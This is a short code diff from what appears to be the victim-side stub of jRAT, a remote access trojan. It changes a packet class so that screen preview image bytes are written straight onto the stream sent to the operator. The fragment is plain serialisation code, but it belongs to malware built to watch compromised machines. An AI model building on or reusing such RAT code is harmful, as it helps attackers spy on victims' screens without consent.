@@ -3,28 +3,26 @@ package se.jrat.stub.packets.outgoing;
 import java.io.DataOutputStream;
 
 import se.jrat.common.io.StringWriter;
-import se.jrat.stub.Connection;
 
 
 public class Packet43PreviewImage extends AbstractOutgoingPacket {
 
-	private int length;
+	private byte[] buffer;
 	private int width;
 	private int height;
 
-	public Packet43PreviewImage(int length, int width, int height) {
-		this.length = length;
+	public Packet43PreviewImage(byte[] buffer, int width, int height) {
+		this.buffer = buffer;
 		this.width = width;
 		this.height = height;
 	}
 
 	@Override
 	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
-		dos.writeInt(length);
 		dos.writeInt(width);
 		dos.writeInt(height);
-
-		Connection.lock();
+		dos.writeInt(buffer.length);
+		dos.write(buffer);
 	}
 
 	@Override
